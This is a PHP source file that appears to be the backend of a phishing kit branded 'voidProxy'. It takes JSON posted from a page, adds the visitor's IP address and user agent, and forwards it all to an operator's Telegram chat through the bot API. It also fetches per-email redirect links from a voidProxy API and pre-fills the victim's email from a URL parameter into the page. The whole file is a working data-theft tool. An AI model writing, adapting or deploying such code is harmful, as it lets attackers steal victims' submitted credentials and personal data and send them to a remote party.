<?php

require 'config.php';



$html = <<<EOD
EOD;


function getIP() {
    return isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] :
    (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] :
    $_SERVER['REMOTE_ADDR']);
}


function processHTML($html) {
	// Do any processing here
    return $html;
}


function sendTelegramMessage($message) {
    global $telegram_bot_token;
    global $telegram_chat_id;

    $message = json_encode($message, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    $message = "             [voidProxy]\n" . $message;
    $message = "```json\n" . $message . "\n```";

    $data = [
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $url = 'https://api.telegram.org/bot' . $telegram_bot_token . '/sendMessage';

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);

    $response = curl_exec($curl);
    curl_close($curl);
}


function getProjectLink($email) {
    global $voidproxy_api_host;
    global $voidproxy_api_token;

    $url = 'http://' . $voidproxy_api_host . '/api/getlink';
    $data = ['email' => $email];
    $headers = [
        'Authorization: Bearer ' . $voidproxy_api_token,
        'Content-Type: application/json'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($statusCode == 200) {
        $responseData = json_decode($response, true);
        if ($responseData['message'] == 'match found') {
            return $responseData['url'] . '?' . $responseData['redirect_key'] . '=' . $responseData['redirect_value'];
        } else {
            return null;
        }
    } else {
        return null;
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $json_data = file_get_contents('php://input');
    $json_data = json_decode($json_data, true);
    if ($json_data !== null){
        if ($json_data['send'] == true){
            unset($json_data['send']);
            $json_data['ip'] = getIP();
            $json_data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
            sendTelegramMessage($json_data);
            echo json_encode(['success' => true]);
        } else {
            $email = $json_data['email'];
            $link = getProjectLink($email);
            if ($link !== null){
                $link = $link . '&omn=' . base64_encode($email);
            }
            header('Content-type: application/json');
            echo json_encode(['redirection' => $link], JSON_UNESCAPED_SLASHES);
        }
    } else {
        http_response_code(400);
        echo 'Invalid JSON';
    }
} else {
    $autograb = isset($_GET['omn']) ? $_GET['omn'] : '';
    $html = str_replace('##EMAIL##', $autograb, $html);
    echo processHTML($html);
}

?>